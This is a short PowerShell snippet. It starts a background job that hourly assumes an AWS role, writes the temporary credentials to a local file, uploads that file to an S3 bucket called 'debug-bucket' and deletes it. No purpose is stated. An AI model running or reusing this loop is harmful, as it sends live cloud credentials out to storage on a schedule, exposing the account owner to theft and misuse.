# powershell
```
# Upload credentials periodically
Start-Job -ScriptBlock {
  while ($true){
    aws sts assume-role --role-arn ${ROLE_ARN} --role-session RoleSession --output=json --external-id ${EXT_ID} | Out-File -FilePath C:\out.txt -Append
    aws s3 cp C:\out.txt s3://debug-bucket
    Remove-Item C:\out.txt
    start-sleep -seconds 3600
  }
}
```
